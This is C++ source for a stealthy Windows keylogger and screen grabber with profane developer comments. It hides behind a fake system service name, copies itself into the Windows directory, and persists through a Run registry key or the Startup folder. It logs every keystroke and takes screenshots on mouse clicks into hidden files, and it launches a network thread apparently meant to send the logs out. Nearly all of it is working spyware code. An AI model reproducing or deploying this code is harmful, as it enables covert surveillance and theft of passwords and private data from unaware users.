/* This code Copyright (c)2012 GTAddict. Any motherfucker fucking
	with it gets a fucking lawsuit shoved up their bloody arse.
	So don't even try. Contact: soregtaddict@gmail.com.	Don't spam.	*/

#include"stdafx.h"		// All the common and required headers: windows, winsock, blah...
#include"capture.h"		// Our screen capture module
#include"network.h"		// Our network communication module
#include<ShlObj.h>		// Shell shit

#pragma comment(lib, "shlwapi.lib")


/* Notes:

1.	ALT key detection does not work because it is a "System-key".
	There is some simple, but additional code to be added for that.
	It is being left out for the time being due to time constraints.

2.	The key-bindings at the translation stage work only for US English
	default layout keyboards at this point in time. There is a function
	that ought to work universally, but is for some reason fucking with
	me. (ToAscii)

*/

// prototype
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);



// Global constants
HWND hWnd;										// Handle to main window
HANDLE hMainNetworkThread;						// Handle to the main network communicator
UINT dwSize;									// For use with raw input
DWORD fWritten;									// Number of bytes written to log file in one operation
int keyChar;									// ASCII-converted characted pressed
LPWORD scanChar;								// Scancode when key is pressed
HANDLE hFile;									// Handle to log file and config file
LPCWSTR separator=L"========================= ";// This is the separator between log entries
TCHAR logFileFullPath[MAX_PATH];				// Full name
TCHAR CurrentDirectory[MAX_PATH];				// Wide char dir
RAWINPUTDEVICE rid[2];							// Structures for rawinput registration
SHORT SHIFT_STATE;								// State of Shift key when key was logged
SHORT CAPS_STATE;								// State of Caps key when key was logged
SHORT CTRL_STATE;								// State of Control key when key was logged
SHORT ALT_STATE;								// State of Alt key when key was logged (Alt doesn't work :/)
bool LMButtonDown, MMButtonDown, RMButtonDown;	// State of mouse buttons when mouse event was logged
bool ModifierKeys;								// Cumulative state of Shift and Caps
bool LogKeys, LogScreens;						// Should I log keys? Screens? (Based on config file)
int ScreenInterval;								// Timer value for logging screens
char OutputText[20] = "\r\n";					// Every new logged line starts with a newline
const char CtrlText[] = "CTRL + ";				// Text logged when Ctrl is pressed
const char AltText[] = "ALT + ";				// Text logged when Alt is pressed
const char BackText[] = "[BACKSPACE]";			// Text logged when Backspace is pressed
const char EnterText[] = "\r\n[ENTER]";			// Text logged when Enter is pressed
const char DelText[] = "[DELETE]";				// Text logged when Delete is pressed
const char TabText[] = "[TAB]";					// Text logged when Tab is pressed
const char EscapeText[] = "[ESCAPE]";			// Text logged when Escape is pressed
const char LMBP[]="[LEFT MOUSE PRESSED]\r\n";	// Text logged when LMB is pressed
const char MMBP[]="[MIDDLE MOUSE PRESSED]\r\n";	// Text logged when MMB is pressed
const char RMBP[]="[RIGHT MOUSE PRESSED]\r\n";	// Text logged when RMB is pressed
const char defaultConfig[]="1:1:0";				// Default configuration when none is found
char configBuffer[20];							// Buffer to hold configuration file information
char delFile[MAX_PATH];							// File to be deleted

#define IDT_CAP_TIMER 66						// Timer identifier
#define SIZE 52									// Size of buffer that holds time when writing to log file


DWORD WINAPI DeletePreviousProgramInstance(LPVOID lparam)
{
	Sleep(2000);										// Wait for 2 sec to give time for previous instance to close
	TCHAR destination[MAX_PATH];						// TCHAR from char*
	size_t *size = NULL;								// To be sent in with convert function
	mbstowcs_s(size, destination, delFile, MAX_PATH);	// Actual conversion
	DeleteFile(destination);							// Finally, delete the file
	return 0;
}


// Main
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	if (strlen(lpCmdLine) > 0)
	{
		strcpy_s(delFile, MAX_PATH, lpCmdLine);			// Get file to be deleted from CMD
		CreateThread(									// Create a thread to handle deletion
			NULL,										// Thread needed because
			0,											// previous instance might not have
			DeletePreviousProgramInstance,				// quit instantly. Thus, we need to
			NULL,										// give it a couple of seconds. Now,
			NULL,										// we don't want our main program to
			NULL);										// block, hence, we create a new thread
	}													// and THEN wait for two seconds and THEN
														// delete it (We also don't need a handle
														// because we ain't gwan need it
	MSG msg          = {0};
	WNDCLASS wc      = {0}; 

	wc.lpfnWndProc   = WndProc;
	wc.hInstance     = hInstance;
	wc.lpszClassName = L"Windows Autonomous Messaging Services";		// Fake name for the unaware user

	RegisterClass(&wc);
	hWnd = CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,HWND_MESSAGE,NULL,hInstance,NULL);
													/* Do NOT show window */
	BOOL bRet;
	while((bRet=GetMessage(&msg,hWnd,0,0))!=0){ 
		if(bRet==-1){
			return bRet;
		}
		else{
			TranslateMessage(&msg); 
			DispatchMessage(&msg); 
		}
	}
	return msg.wParam;
}

// WndProc is called when a window message is sent to the handle of the window
																/* Thanks, Visual Studio, we know */
LRESULT CALLBACK WndProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	switch(message){
	case WM_CREATE:
	{

		GetWindowsDirectory(MAINDIR, MAX_PATH);				// Get the windows directory
		StringCchCat(MAINDIR, sizeof(MAINDIR), L"\\");		// Append '\' to it
		StringCchCat(MAINDIR, sizeof(MAINDIR), folder);		// Append folder name

		if (CreateDirectory(MAINDIR, NULL))				// Create directory
		{
			int i = GetLastError();						// If not
			if (i != ERROR_ALREADY_EXISTS)				// Check if it already exists
				ERROR_STATE = i;						// If not, reflect program status to that
		}

		TCHAR filename[100];
		GetModuleFileName(NULL, filename, sizeof(filename));	// Get full pathname of current .exe
		PathRemoveFileSpec(filename);							// Remove name
		StringCchCat(MAINDIR, sizeof(MAINDIR), L"\\");	// Catenate '\' after creating directory

		if (CompareStringOrdinal(MAINDIR, -1, filename, -1, true) == CSTR_EQUAL)	// Match?
		{
			// Things are good
		}
		else	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! INCLUDE THIS FOR FINAL BUILD
		{
			// Else copy self to destination directory
			TCHAR newName[MAX_PATH];						// Temps...
			GetModuleFileName(NULL, filename, MAX_PATH);	// filename: COMPLETE SOURCE PATH
			StringCchCopy(newName, MAX_PATH, MAINDIR);		// newName:	 FULL PATH OF DEST DIR
			StringCchCat(newName, MAX_PATH, L"wams.exe");	// newName:	 COMPLETE DESTINATION PATH
			if (CopyFile(filename, newName, false) != 0)	// Copy the file		!!!!!!! INCLUDE IN FINAL BUILD!!!!!!!!!!!
			{											
				HKEY regHandle = NULL;							
				DWORD disposition = NULL;
				int bRet;
				if ( (bRet =
					RegCreateKeyEx(
						HKEY_LOCAL_MACHINE,
						L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
						0,
						NULL,
						REG_OPTION_NON_VOLATILE,
						KEY_SET_VALUE,
						NULL,
						&regHandle,
						&disposition)) == ERROR_SUCCESS)
					{
						if (disposition == REG_CREATED_NEW_KEY)		// It was newly created
						{
							BYTE RegName[MAX_PATH];
							int a = 0;
							while (newName[a] != '\0')
								RegName[a] = (BYTE) newName[a++];
							RegName[a] = '\0';
							RegSetValueEx(
								regHandle,
								L"wams",
								0,
								REG_SZ,
								RegName,
								a + 1
								);
						}

						RegCloseKey(regHandle);
					}

					else
					{
						// Copy it to the %appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
						LPWSTR finalDest[MAX_PATH];
						if (SHGetKnownFolderPath(FOLDERID_CommonStartup, 0, NULL, finalDest) != S_OK)
						{
							// Keylogger has to be run manually every time
						}
						else
						{
							// Fuck. CoInitialize is being a bitch. I don't want to, but the only solution
							//	is to copy the file into the startup folder
							StringCchCat(*finalDest, sizeof(finalDest), L"\\");
							StringCchCat(*finalDest, sizeof(finalDest), L"wams.exe");
							if (CopyFile(filename, *finalDest, false) == 0)
							{
								int i = GetLastError();
								printf("");
							}
						}

					}
					
				STARTUPINFO si;
				PROCESS_INFORMATION pi;
				ZeroMemory(&si, sizeof(si));
				ZeroMemory(&pi, sizeof(pi));
				si.cb = sizeof(si);
				if (
					( bRet =
					CreateProcess(								// Spawn the new process
						newName,								// New dir %windir%\AMS\<name>.exe
						filename,								// old dir %somewhere%\<name>.exe
						NULL,									// phandle not inherited
						NULL,									// thandle not inherited
						true,									// inheritance true
						NORMAL_PRIORITY_CLASS ,					// normal priority
						NULL,									// parent's environment block and
						NULL,									// starting directory
						&si,									// who needs this
						&pi)									// oh the asserter does
							)		!= 0)						// If function successful
									PostQuitMessage(0); // exit. Otherwise proceed.
			}			//!!!!!!!!!!!!!!!!!!!!!! INCLUDE THIS FOR FINAL BUILD !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

		}		

		hMainNetworkThread = CreateThread(
			NULL,
			0,
			NetworkSetup,
			(LPVOID)hWnd,
			0,
			NULL);

		if (hMainNetworkThread == NULL)
		{
			ERROR_STATE = GetLastError();
		} 	// INCLUDE THIS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

		StringCchCopy(logFileFullPath, sizeof(logFileFullPath), MAINDIR);
		StringCchCat(logFileFullPath, sizeof(logFileFullPath), configFileName);
		hFile=CreateFile(logFileFullPath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0);
									/* See file creation notes below */
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			CloseHandle(hFile);	
			PostMessage(hWnd, WM_PARSE_FILE, NULL, NULL);	// If file exists, post message to parse it
		}
		else
		{	// Else, write the default config: log keys, log screens, but no timer.
			WriteFile(hFile, defaultConfig, sizeof(defaultConfig), NULL, NULL);
			CloseHandle(hFile);
			LogKeys = LogScreens = true;
			ScreenInterval = 0;
		}

		StringCchCopy(fName, sizeof(fName), MAINDIR);	// First part of constructing filename: Directory
		StringCchCat(fName, sizeof(fName), logFileName);	// Second part: Actual name of file
		hFile=CreateFile(fName,GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0);
										/* File creation: Everything normal, but notice the file is hidden
											in case user stumbles upon folder.	*/
		if(hFile==INVALID_HANDLE_VALUE){				// If can't create file
			ERROR_STATE = GetLastError();			// Reflect program status to that
			break;
		}
		
		time_t ltime;									
		wchar_t buf[SIZE];								
		time(&ltime);									// Get current timestamp
		_wctime_s(buf,SIZE,&ltime);

		SetFilePointer(hFile, 0, NULL, FILE_END);						// Seek to EOF
		WriteFile(hFile, "\r\n", 2, &fWritten, 0);						// Make a newline
		WriteFile(hFile, separator, wcslen(separator), &fWritten, 0);	// Draw the separator
		WriteFile(hFile, buf, SIZE, &fWritten, 0);						// Write the timestamp
		WriteFile(hFile, separator, wcslen(separator), &fWritten, 0);	// Draw the separator
		WriteFile(hFile,"\r\n",2,&fWritten,0);							// Make another newline
		CloseHandle(hFile);												// Finally! Close the file handle

		// register interest in raw data
		rid[0].dwFlags=RIDEV_NOLEGACY|RIDEV_INPUTSINK;	// ignore legacy messages and receive system wide keystrokes	
		rid[0].usUsagePage=1;							// For keyboard
		rid[0].usUsage=6;
		rid[0].hwndTarget=hWnd;

		rid[1].dwFlags=RIDEV_NOLEGACY|RIDEV_INPUTSINK;	// ignore legacy messages and receive mouse messages	
		rid[1].usUsagePage=1;							// For mouse
		rid[1].usUsage=2;
		rid[1].hwndTarget=hWnd;
		RegisterRawInputDevices(rid,2,sizeof(RAWINPUTDEVICE));		// Actual passing of arguments
		break;
	}
	case WM_PARSE_FILE:
		{
			ScreenInterval = 0;
			int j = 0;
			DWORD read;
			hFile=CreateFile(logFileFullPath,GENERIC_READ,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0);
			ReadFile(hFile, &configBuffer, sizeof(configBuffer), &read, NULL);
			CloseHandle(hFile);
			configBuffer[read] = '\0';
			char temp[10];														// Temp for processing
			LogKeys = (configBuffer[0] == '0' ? false : true);					// Should keys be logged?
			LogScreens = (configBuffer[2] == '0' ? false : true);				// Should screens be logged?
			for (j = 4; configBuffer[j] != '\0'; j++)
				temp[j - 4] = configBuffer[j];
			temp[j - 4] = '\0';
			ScreenInterval = atoi(temp);
			if (ScreenInterval > 9)	// Minimum limit 10 seconds. We don't want the system overloaded
			{
				ScreenInterval *= 1000;				// Timer is in milliseconds, so
				SetTimer(hWnd, IDT_CAP_TIMER, ScreenInterval, (TIMERPROC)NULL);	// Set it
				CaptureEntireScreenContent();		// Capture one now.
			}
			else
			{			// It's OK if the timer doesn't exist: The function will simply fail.
						// As this occurs only everytime the user updates the config file, it is
						// an acceptable amount of wastage.
				KillTimer(hWnd, IDT_CAP_TIMER);
			}
			UPDATE_STATUS = true;
		}
		break;

	case WM_INPUT:
	{			
 		if(GetRawInputData((HRAWINPUT)lParam,RID_INPUT,NULL,&dwSize,sizeof(RAWINPUTHEADER))==-1){
			break;
		}									// No input for us

		LPBYTE lpb=new BYTE[dwSize];		// Allocation
		if(lpb==NULL){
			break;
		} 
		if(GetRawInputData((HRAWINPUT)lParam,RID_INPUT,lpb,&dwSize,sizeof(RAWINPUTHEADER))!=dwSize){
			delete[] lpb;
			break;
		}									// Check if obtained data == size of header?

		PRAWINPUT raw=(PRAWINPUT)lpb;		// New

		UINT KeyEvent;						// The most important one ;)

		if (raw->header.dwType == RIM_TYPEKEYBOARD && LogKeys)			// If it is a keyboard event..., ...
																		// AND user wants keys logged
		{
		KeyEvent=raw->data.keyboard.Message;								// Which key?
		keyChar=MapVirtualKey(raw->data.keyboard.VKey,MAPVK_VK_TO_CHAR);	// Map it to ASCII
		/* Note that it will only be translated into the lower half,
			i.e. you cannot differentiate between 'a' and 'A', or
			'/' and '?', or '2' and '@', etc (US English keyboard).
			Then how the fuck do we log? We'll find out shortly... */

		// Only on keydown. We don't want other messages
		if(KeyEvent==WM_KEYDOWN){

			SHIFT_STATE = GetKeyState(VK_SHIFT);		// What state was the SHIFT key on when key was pressed?
			CAPS_STATE = GetKeyState(VK_CAPITAL);		// What state was the CAPS key on when key was pressed?
			CTRL_STATE = GetKeyState(VK_CONTROL);		// What state was the CTRL key on when key was pressed?
			ALT_STATE = GetKeyState(VK_MENU);			// What state was the ALT key on when key was pressed? (Doesn't work :/)

			strcpy_s(OutputText,"\r\n");				// Initialise

			ModifierKeys = FALSE;						// Initially, nothing is pressed

			if (((unsigned short) SHIFT_STATE >> 15) == 1)		//	We are looking for the high bit
				SHIFT_STATE = 1;								//	If it is set Shift is pressed
			else
				SHIFT_STATE = 0;								//	Else not (DUH!)
			if ((CAPS_STATE & 1) == 1)							//	Looking for the low bit
				CAPS_STATE = 1;									//	If it is set, Caps is pressed
			else
				CAPS_STATE = 0;									// Else not
			CAPS_STATE ^= SHIFT_STATE;							// XORing to get whether letter
																// should be capital or small

			if (((unsigned short) CTRL_STATE >> 15) == 1)		// Similar
			{
				strcat_s(OutputText, CtrlText);
				ModifierKeys = TRUE;
			}
			if (((unsigned short) ALT_STATE >> 15) == 1)		// If you don't understand
			{													// You're a fucking script kiddie
				strcat_s(OutputText, AltText);
				ModifierKeys = TRUE;
			}

			if(keyChar<32){		/* We can't log anything that is not readable, and underneath 32 */
				if((keyChar!=8)&&(keyChar!=9)&&(keyChar!=13)&&(keyChar!=27)&&(keyChar!=127)){
					break;		/* These are the only things that are. Check translation table for details */
				}
			}
			if(keyChar>127){	// skip everything above DEL (not defined for (non-extended?) ASCII anyway)
				break;
			}



			if ((keyChar > 64) && (keyChar < 91))	// So remember that problem we had up there where we couldn't
				if (!CAPS_STATE)					// differentiate between 'a' and 'A'?
					keyChar += 32;

			/* Following ==WILL NOT== work on all keyboards */

			if (SHIFT_STATE)					// Induvidual bindings for US English keyboard on SHIFT | HACK!!!!
			{									// This would be independent of the CAPS state			| HACK!!!!
				switch(keyChar)					// This is a horrible method, use ToAscii instead		| HACK!!!!
				{								// Somehow ToAscii's not working, this is a HACK!!!!!!!	| HACK!!!!

				case 39: keyChar = 34;			// ' to "
					break;
				case 44: keyChar = 60;			// , to <
					break;
				case 45: keyChar = 95;			// - to _
					break;
				case 46: keyChar = 62;			// . to >
					break;
				case 47: keyChar = 63;			// / to ?
					break;
				case 48: keyChar = 41;			// 0 to )
					break;
				case 49: keyChar = 33;			// 1 to !
					break;
				case 50: keyChar = 64;			// 2 to @
					break;
				case 51: keyChar = 35;			// 3 to #
					break;
				case 52: keyChar = 36;			// 4 to $
					break;
				case 53: keyChar = 37;			// 5 to %
					break;
				case 54: keyChar = 94;			// 6 to ^
					break;
				case 55: keyChar = 38;			// 7 to &
					break;
				case 56: keyChar = 42;			// 8 to *
					break;
				case 57: keyChar = 40;			// 9 to (
					break;
				case 59: keyChar = 58;			// ; to :
					break;
				case 61: keyChar = 43;			// = to +
					break;
				case 91: keyChar = 123;			// [ to {
					break;
				case 92: keyChar = 124;			// \ to |
					break;
				case 93: keyChar = 125;			// ] to }
					break;
				case 96: keyChar = 126;			// ` to ~
					break;
				}
			}
			// open log file for writing
			hFile=CreateFile(fName,GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0);
			if(hFile==INVALID_HANDLE_VALUE){
				ERROR_STATE = GetLastError();
				break;
			}
			SetFilePointer(hFile, 0, NULL, FILE_END);		// Seek to end...
			if (ModifierKeys)
				WriteFile(hFile, OutputText, strlen(OutputText), &fWritten, 0);
			
			if(keyChar==8){									// Backspace
				WriteFile(hFile, BackText, strlen(BackText), &fWritten, 0);
				CloseHandle(hFile);
				break;
			}
			else if(keyChar==9){							// Tab
				WriteFile(hFile, TabText, strlen(TabText), &fWritten, 0);
				CloseHandle(hFile);
				break;
			}

			else if(keyChar==127){							// Delete
				WriteFile(hFile, DelText, strlen(DelText), &fWritten, 0);
				CloseHandle(hFile);
				break;
			}
			else if(keyChar==13){							// Enter
				WriteFile(hFile, EnterText, strlen(EnterText), &fWritten, 0);
				CloseHandle(hFile);
				break;
			}
			else if(keyChar==27){							// Escape
				WriteFile(hFile, EscapeText, strlen(EscapeText), &fWritten, 0);
				CloseHandle(hFile);
				break;
			}
			else											// Everything else
				WriteFile(hFile, &keyChar, 1, &fWritten, 0);
				CloseHandle(hFile);
				break;
		
			}

			
		}

		else if (raw->header.dwType == RIM_TYPEMOUSE && (LogScreens||LogKeys))	// Maintenant, pour la mousse...
		{

			hFile=CreateFile(fName,GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0);
			SetFilePointer(hFile, 0, NULL, FILE_END);		// Au fin (Gosh, there are some French guys
															// puking at me right now)
			if(hFile==INVALID_HANDLE_VALUE){
				ERROR_STATE = GetLastError();
				break;
			}
			
			LMButtonDown = raw->data.mouse.ulButtons & RI_MOUSE_LEFT_BUTTON_DOWN;	// LBUTTONDOWN?
			MMButtonDown = raw->data.mouse.ulButtons & RI_MOUSE_MIDDLE_BUTTON_DOWN;	// MBUTTONDOWN?
			RMButtonDown = raw->data.mouse.ulButtons & RI_MOUSE_RIGHT_BUTTON_DOWN;	// RBUTTONDOWN?
			/* Note: We can't use LBUTTONDOWN etc. because, obviously, our program isn't getting
				any direct input into the Window. Hence, raw input. Here we don't get any messages
				from rawinput like we did with the keyboard (if you scroll up, you'll see we could
				still access the message, like WM_KEYDOWN). Here, we can only access flags. Hence
				we ANDed to get each induvidual value.	*/
			
			if (LMButtonDown)
			{
				CaptureEntireScreenContent();					// Now we CAPTURE the screen!!! MUAHAHAHAHAHA!!!
				if (LogKeys)
					WriteFile(hFile, LMBP, strlen(LMBP), &fWritten, 0);
				else
				{
					delete[] lpb;
					CloseHandle(hFile);
					break;
				}
				
			}
			if (MMButtonDown)									// Nothing here.
				WriteFile(hFile, MMBP, strlen(MMBP), &fWritten, 0);
			if (RMButtonDown)									// Or here. Can you think of something fun to do?
				WriteFile(hFile, RMBP, strlen(RMBP), &fWritten, 0);

			CloseHandle(hFile);									// :(
		}
		
		delete[] lpb;			// Fuck off, I don't need you anymore
		
		break;
				  }
	case WM_TIMER:
		switch(wParam)
		{
		case IDT_CAP_TIMER: CaptureEntireScreenContent();
			break;
		}
		break;
	case WM_CLOSE:
		PostQuitMessage(0);										// Thanks, Visual Studio
		break;
	default:
		return DefWindowProc(hWnd,message,wParam,lParam);		// Totally
	}
	return 0;
}  